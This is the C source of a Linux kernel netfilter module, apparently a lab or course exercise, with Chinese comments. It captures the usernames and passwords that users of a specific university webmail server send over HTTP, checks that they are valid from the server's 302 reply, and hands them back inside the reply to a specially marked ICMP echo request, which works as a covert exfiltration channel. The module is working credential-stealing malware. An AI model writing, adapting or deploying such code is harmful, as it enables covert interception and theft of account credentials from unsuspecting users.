
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/icmp.h>
#include <linux/in.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>


/*
NF_DROP                丢弃该数据包
NF_ACCEPT            保留该数据包
NF_STOLEN            忘掉该数据包
NF_QUEUE            将该数据包插入到用户空间
NF_REPEAT            再次调用该hook函数
*/

/*
NF_INET_PRE_ROUTING    在完整性校验之后，选路确定之前
NF_INET_LOCAL_IN        在选路确定之后，且数据包的目的是本地主机
NF_INET_FORWARD        目的地是其它主机地数据包
NF_INET_LOCAL_OUT        来自本机进程的数据包在其离开本地主机的过程中
NF_INET_POST_ROUTING    在数据包离开本地主机“上线”之前
*/

#define MAGIC_CODE   0x5B
#define REPLY_SIZE   36

MODULE_LICENSE("GPL");

static struct nf_hook_ops out;
static struct nf_hook_ops in_http;
static struct nf_hook_ops in_icmp;
static struct nf_hook_ops in_http;


static char username[20] = {0};
static char password[20] = {0};
static char username_temp[20] = {0};
static char password_temp[20] = {0};
static int have_pair = 0;
static int flag=0;

static void check_http(const struct tcphdr *tcph);
static unsigned short checksum(int numwords, unsigned short *buff);


u_long change_uint(u_long a, u_long b, u_long c, u_long d){
    u_long address = 0;
    address |= d<<24;
    address |= c<<16;
    address |= b<<8;
    address |= a;
    return address;
};


/*
    窃取邮箱用户名和密码
*/
unsigned int watch_out(unsigned int hooknum,
                       struct sk_buff *skb,
                       const struct net_device *in,
                       const struct net_device *out,
                       int(okfn)(struct sk_buff *))
{
    
    struct iphdr * iph;
    struct tcphdr *tcph;
    iph = ip_hdr(skb);

    /*如果不是tcp报，则允许output*/
    if(iph->protocol!=IPPROTO_TCP){
        //printk("11 %d\n",iph->daddr);
        return NF_ACCEPT;   
    }

    /*判断是否发往"202.38.64.8"（科大邮箱ip）的报文*/
    if(iph->daddr!=change_uint(202,38,64,8)){
        //printk("1111\n");
        return NF_ACCEPT;
    }
    
    /*判断是否为HTTP报文*/
    tcph = (struct tcphdr*)((u_char *)iph+iph->ihl*4);
    if(tcph->dest!=htons(80)){
        //printk("11 %d\n",iph->daddr);
        return NF_ACCEPT; 
    }
    check_http(tcph);
    return NF_ACCEPT;

}


/*
    解析http报文
*/
static void check_http(const struct tcphdr *tcph){
    u_char *data = (u_char *)tcph;
    u_char *pos_uid;
    u_char *pos_password;
    char *pattern_uid = "&uid";
    char *pattern_password = "password";

    int d=0;
    u_char *p;

    /*指向http数据*/
    data += tcph->doff * 4;   //offset包头长度占４位，最多能表示15个32bit的长度）
 
    /* 首先判断是否为post请求包*/
    if(strncmp(data,"POST",4)==0)
    {
         
        /*判断是否同时存在用户名和密码字段*/
         /*
             找出str2字符串在str1字符串中第一次出现的位置（不包括str2的串结束符）。
             返回该位置的指针，如找不到，返回空指针。
        */
        pos_uid = strstr(data,pattern_uid);
        pos_password = strstr(data,pattern_password);
        /*如果存在，则抓取用户名和密码*/
        if((pos_uid!=NULL)&&(pos_password!=NULL))
        {
		printk("%s\n",data);
            u_short i=0; 
            pos_uid+=5;
            pos_password+=9;
            /*抓取用户名*/
            while(*pos_uid != '&'){
                username_temp[i++] = *pos_uid;
                pos_uid++;
            }
            username_temp[i]='\0';
            /*抓取密码*/
            i=0;
            while(*pos_password != '&'){
                password_temp[i++] = *pos_password;
                pos_password++;
            }
            password_temp[i] = '\0';
            have_pair=1;		       /* Have a pair. Ignore others until*/
            printk("Capture a pair of uid&pwd, but not authentic: uid=%s,pwd=%s\n",username_temp,password_temp);          
        }
      //  have_pair=0;//hvae no uid/pwd or have only uid
    }
}


static unsigned int watch_in_http(unsigned int hooknum,
    struct sk_buff *skb,
    const struct net_device *in,
    const struct net_device *out,
    int (*okfn)(struct sk_buff *))
{   
    u_char *http_data ;
    struct iphdr * iph;
    struct tcphdr *tcph;
    iph = ip_hdr(skb);
    tcph = (struct tcphdr*)((u_char *)iph+iph->ihl*4);
    http_data=(u_char*)tcph;
    http_data += tcph->doff * 4; 
    /*如果不是tcp报，则允许input*/
    if(iph->protocol!=IPPROTO_TCP){
        //printk("11 %d\n",iph->daddr);
        return NF_ACCEPT;   
    }

    /*判断是否来自"202.38.64.8"（科大邮箱ip）的报文*/
    if(iph->saddr!=change_uint(202,38,64,8)){
        //printk("1111\n");
        return NF_ACCEPT; 
    }
    
    /*判断是否为HTTP报文*/
    
    if(tcph->source!=htons(80)){
        //printk("11 %d\n",iph->daddr);
        return NF_ACCEPT; 
    }

   http_data+=9;
 	//the uid&pwd in the cache is correct
    	if(have_pair!=0&&strncmp(http_data,"302",3)==0){
	    memcpy(username,username_temp,20);
	    memcpy(password,password_temp,20);
    
       	 	printk("The uid&pwd is correct! uid=%s,pwd=%s\n",username,password);
		flag=1;
		//clean the cache    		
		have_pair=0; 
		memset(username_temp,0x00,20);
	   	memset(password_temp,0x00,20);
	}
	//the correct uid&pwd have been copied(have_pair==0) or is not correct
	if(have_pair!=0&&strncmp(http_data,"302",3)!=0) {
		printk("The uid(%s)&pwd(%s) is wrong!\n", username_temp,password_temp);
		printk("The correct uid&pwd should be: uid=%s,pwd=%s\n",username,password);
		//wrong uid&pwd, drop!
		have_pair=0;
		memset(username_temp,0x00,20);
	   	memset(password_temp,0x00,20);
	}
     

    	return NF_ACCEPT;

}



static unsigned int watch_in_icmp(unsigned int hooknum,
    struct sk_buff *skb,
    const struct net_device *in,
    const struct net_device *out,
    int (*okfn)(struct sk_buff *))
{   
    struct sk_buff *sb = skb;
    struct iphdr *iph;
    struct icmphdr *icmph;
    char *cp_data;		       /* Where we copy data to in reply */
    unsigned int   taddr;	       /* Temporary IP*/
    
    iph = ip_hdr(sb);
    int error=0;
    
    /*目前没有抓取到correct用户名密码，不作任何处理。接收*/
    if (!flag)
        return NF_ACCEPT;
    
    /*不是ICMP包，同样不往下做任何处理。接收*/
    if(iph->protocol!=IPPROTO_ICMP)
        return NF_ACCEPT;
    
    /*是否是特殊构造的ICMP包*/
    icmph = (struct icmphdr *)(sb->data + ip_hdr(sb)->ihl * 4);
    if (icmph->code != MAGIC_CODE || icmph->type != ICMP_ECHO) {
        return NF_ACCEPT;
    }


    /*重新构造包*/
    /*交换原ip目的ip*/
    taddr = ip_hdr(sb)->saddr;
    ip_hdr(sb)->saddr = ip_hdr(sb)->daddr;
    ip_hdr(sb)->daddr = taddr;

    /*
    以太网目的地址＋以太网原地址＋帧类型＋硬件类型＋协议类型
    */
    sb->pkt_type = PACKET_OUTGOING; //帧类型

    /*交换原mac目的mac地址*/
    switch (sb->dev->type) {
		case ARPHRD_PPP:                       /* Ntcho iddling needs doing */
			break;
        case ARPHRD_LOOPBACK:
        case ARPHRD_ETHER: //硬件类型为以太网
			{   

                unsigned char t_hwaddr[ETH_ALEN];
            
				/* Move the data pointer to point to the link layer header */
                // skb_push(sb, ETH_HLEN);
                sb->data = (unsigned char *)eth_hdr(sb);//内核提供的宏来存取这个数据结构eg:#define FRAG_CB(skb)    ((struct ipfrag_skb_cb *)((skb)->cb))
                sb->len += ETH_HLEN; 
                
				memcpy(t_hwaddr, (eth_hdr(sb)->h_dest), ETH_ALEN);
				memcpy((eth_hdr(sb)->h_dest), (eth_hdr(sb)->h_source),ETH_ALEN);
                memcpy((eth_hdr(sb)->h_source), t_hwaddr, ETH_ALEN);
               
			}
    }
    cp_data = (char *)icmph + 8;


    


    if (flag==1){
      memcpy(cp_data, username, 20);
      memcpy(cp_data + 20, password, 20);
      error = dev_queue_xmit(sb);
      	if(error<0)
           printk("send defeat\n");
	
        else{ 
		printk("send success!\n");
    		memset(username, 0x00, 20);
    		memset(password, 0x00, 20);
    		flag=0;
    	}
    

}
    

    
    return NF_STOLEN;
    /*
    STOLEN时经常用于这样的情形，也就是在原始报文的基础上对报文进行了修改，
    然后将修改后的报文发出去了，因此，就要告诉系统忘记原有的那个skb。
    因为skb被修改，并以新的方式发送出去了。
    因此，这里已经没有原始数据包的存在了，需要返回 NF_STOLEN，
    告诉协议栈不用关心原始的包即可。
    否则，若是新数据包是单独申请的内存，
    那么对于原数据包还应该是返回NF_DROP.
    */
}


int init_module(){
	out.hook = watch_out;
	out.hooknum = NF_INET_POST_ROUTING;
	out.pf = PF_INET;
	out.priority = NF_IP_PRI_FIRST; 

    in_icmp.hook = watch_in_icmp;
	in_icmp.hooknum = NF_INET_PRE_ROUTING;
	in_icmp.pf = PF_INET;
	in_icmp.priority = NF_IP_PRI_FIRST; 

    in_http.hook = watch_in_http;
	in_http.hooknum = NF_INET_PRE_ROUTING;
	in_http.pf = PF_INET;
    in_http.priority = NF_IP_PRI_FIRST; 
    
	nf_register_hook(&out);
	nf_register_hook(&in_icmp);
    nf_register_hook(&in_http);
    return 0;
    

}

void cleanup_module(void){
    nf_unregister_hook(&out);
    nf_unregister_hook(&in_icmp);
    nf_unregister_hook(&in_http);
}

static unsigned short checksum(int numwords, unsigned short *buff)
{
   unsigned long sum;
   
   for(sum = 0;numwords > 0;numwords--)
     sum += *buff++;   /* add next word, then increment pointer */
   
   sum = (sum >> 16) + (sum & 0xFFFF);
   sum += (sum >> 16);
   
   return ~sum;
}
 

